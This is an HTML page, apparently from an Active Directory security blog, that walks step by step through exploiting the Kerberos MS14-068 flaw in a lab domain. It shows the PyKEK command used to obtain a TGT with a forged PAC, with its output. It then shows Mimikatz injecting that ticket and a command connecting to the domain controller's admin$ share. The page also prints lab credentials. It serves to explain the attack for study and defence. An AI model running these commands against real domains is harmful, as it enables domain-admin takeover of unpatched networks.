<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Exploit With PyKek</title>
</head><body>The POC is also in MetaSploit.<br/>
Here are the full packet captures:<br/>
<br/>
Stage 1 – Using PyKEK to inject a forged PAC into a valid TGT: <a href="http://adsecurity.org/wp-content/uploads/2014/12/ADSecurityOrg-MS14068-Exploit-KRBPackets.zip">ADSecurityOrg-MS14068-Exploit-KRBPackets</a><br/>
Stage 2 – Using Mimikatz to leverage the forged TGT into the user session &amp; connect to the unpatched Domain Controller’s admin$ share:<a href="http://adsecurity.org/wp-content/uploads/2014/12/ADSecurityOrg-MS14068-Exploit-KRBPackets-TGTInjection-And-DC-AdminShare-Access.zip">&nbsp;ADSecurityOrg-MS14068-Exploit-KRBPackets-TGTInjection-And-DC-AdminShare-Access</a><br/>
<br/>
<b>Stage 1 Attack Packets: PyKEK requests and modifies a TGT</b><br/>
The Python script performs a TGT request (Kerberos Authentication Service Request aka AS-REQ) and instead of requesting a TGT with a PAC (default AS-REQ), PyKEK requests a TGT with no PAC from the Domain Controller.<br/>
<br/>
Once the script receives the valid TGT without a PAC from the DC, the script generates a PAC (with the group membership listed above) packages it in encrypted authorization data as part of a TGS request to the DC (Kerberos Ticket Granting Service Request aka TGS-REQ) to obtain another TGT (a new one with the PyKEK generated PAC).<br/>
“The vulnerable KDC will verify it with MD5 and give you another TGT with a PAC in it”.<br/>
This is the TGT that PyKEK saves to the ccache file used for stage 2.<br/>
<br/>
Since PyKEK communicates with the Domain Controller for valid TGTs, the TGT is a valid ticket (other than the forged PAC it includes). To summarize, there are two TGTs involved in the process: the original one without a PAC as a result of the first AS-REQ and a second one the DC delivers in the TGS-REP with the PyKEK generated PAC.<br/>
<br/>
NOTE: The TGT is technically not modified by PyKEK since it is encrypted by the KDC account (KRBTGT). The process the script uses results in a valid TGT with the PAC PyKEK created that is accepted by an unpatched DC. The genius part of this is that PyKEK uses the Kerberos AS &amp; TGS exchanges to forge a PAC and have the DC place it into a new user TGT. Then when the TGT is presented later on in Stage 2 for a valid TGS, the PAC is accepted and its values carried on into the new TGS for a Kerberos service in AD.<br/>
<br/>
c:\Temp\pykek&gt; ms14-068.py -u darthsidious@lab.adsecurity.org -p TheEmperor99! -s S-1-5-21-1473643419-774954089-2222329127-1110 -d adsdc02.lab.adsecurity.org<br/>
<br/>
[+] Building AS-REQ for adsdc02.lab.adsecurity.org… Done!<br/>
[+] Sending AS-REQ to adsdc02.lab.adsecurity.org… Done!<br/>
[+] Receiving AS-REP from adsdc02.lab.adsecurity.org… Done!<br/>
[+] Parsing AS-REP from adsdc02.lab.adsecurity.org… Done!<br/>
[+] Building TGS-REQ for adsdc02.lab.adsecurity.org… Done!<br/>
[+] Sending TGS-REQ to adsdc02.lab.adsecurity.org… Done!<br/>
[+] Receiving TGS-REP from adsdc02.lab.adsecurity.org… Done!<br/>
[+] Parsing TGS-REP from adsdc02.lab.adsecurity.org… Done!<br/>
[+] Creating ccache file ‘TGT_darthsidious@lab.adsecurity.org.ccache’… Done!<br/>
<br/>
<b>Stage 2 Attack Packets: Using Mimikatz to leverage the forged TGT &amp; connect to DC Admin$ Share:</b>&nbsp; <br/>
This stage leverages Mimikatz to clear the existing Kerberos tickets in memory for the current user and places the TGT created in Stage 1 into memory for use.<br/>
At this point, the user can connect to the unpatched DC with full admin credentials. The act of attempting to connect to the Admin$ share on the DC generates a TGS-REQ and resulting TGS-REP (with a KRB-ERR mixed in for spice).<br/>
<br/>
c:\Temp\pykek&gt; c:\temp\mimikatz\mimikatz.exe “kerberos::ptc c:\temp\TGT_darthsidious@lab.adsecurity.org.ccache” exit<br/>
<br/>
.#####. &nbsp; mimikatz 2.0 alpha (x64) release “Kiwi en C” (Nov 20 2014 01:35:45)<br/>
.## ^ ##.<br/>
## / \ ## &nbsp;/* * *<br/>
## \ / ## &nbsp; Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )<br/>
‘## v ##’ &nbsp; http://blog.gentilkiwi.com/mimikatz &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (oe.eo)<br/>
‘#####’ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; with 15 modules * * */<br/>
<br/>
mimikatz(commandline) # kerberos::ptc c:\temp\TGT_darthsidious@lab.adsecurity.org.ccache<br/>
Principal : (01) : darthsidious ; @ LAB.ADSECURITY.ORG<br/>
Data 0<br/>
Start/End/MaxRenew: 12/7/2014 3:10:30 PM ; 12/8/2014 1:10:30 AM ; 12/14/2014 3:10:30 PM<br/>
Service Name (01) : krbtgt ; LAB.ADSECURITY.ORG ; @ LAB.ADSECURITY.ORG<br/>
Target Name &nbsp;(01) : krbtgt ; LAB.ADSECURITY.ORG ; @ LAB.ADSECURITY.ORG<br/>
Client Name &nbsp;(01) : darthsidious ; @ LAB.ADSECURITY.ORG<br/>
Flags 50a00000 &nbsp; &nbsp;: pre_authent ; renewable ; proxiable ; forwardable ;<br/>
Session Key &nbsp; &nbsp; &nbsp; : 0x00000017 – rc4_hmac_nt<br/>
af5e7b47316c4cebae0a7ead04059799<br/>
Ticket &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: 0x00000000 – null &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;; kvno = 2 &nbsp; &nbsp; &nbsp; &nbsp;[…]<br/>
* Injecting ticket : OK<br/>
<br/>
mimikatz(commandline) # exit<br/>
Bye!<br/>
<br/>
c:\Temp\pykek&gt; net use \\adsdc02.lab.adsecurity.org\admin$<br/>
<br/>
From here, the user has a valid TGS for the CIFS service on the DC and can use it to access the admin$ share via SMB.<br/>
</body></html>